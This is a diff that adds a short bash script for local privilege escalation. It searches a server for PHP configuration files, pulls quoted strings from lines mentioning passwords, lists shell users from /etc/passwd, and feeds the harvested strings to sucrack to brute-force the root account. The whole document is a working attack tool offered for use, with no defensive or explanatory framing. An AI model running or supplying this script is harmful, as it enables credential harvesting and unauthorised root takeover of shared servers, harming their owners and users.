@@ -1,0 +1,47 @@
+#!/bin/bash
+echo ""
+count=0
+blankLine=" "
+
+echo "[+]USING LOCATE MODE !"
+echo "[+]Searching conf files . . ."
+
+locate *conf*.php > PATHS
+TOTAL=`grep -c . PATHS`
+echo "->DONE!"
+
+echo "[+]Searching passwords in config files . . ."
+
+##### for begin
+for i in `cat PATHS`;do
+grep -i pass $i > tmp
+perl -wne'while(/\x27(.+?)\x27/g){print "$1\n"}' tmp >> CAUGHT.tmp
+perl -wne'while(/\x22(.+?)\x22/g){print "$1\n"}' tmp >> CAUGHT.tmp
+count=$[count + 1]
+
+echo -n -e "\r$blankLine\r"
+echo -n -e "[+]PROGRESS: $count OF $TOTAL SEARCHED"
+
+done
+##### for end
+
+echo -n -e "\r$blankLine\r"
+echo -n -e "->DONE!								"
+echo " "
+cat CAUGHT.tmp | sort -u > CAUGHT
+
+##### remove temp files
+rm -f CAUGHT.tmp PATHS tmp
+
+####
+
+echo "[+]GETTING SHELL USERS . . ."
+cat /etc/passwd | grep -i sh | cut -d : -f 1 > USERS
+echo "[+]CRACKING ROOT . . . "
+./sucrack -w 20 -u root CAUGHT
+
+###### motd 
+echo "
+IF YOU FID NOT SUCCESSFULLY CRACK ROOT
+TRY ./users
+"
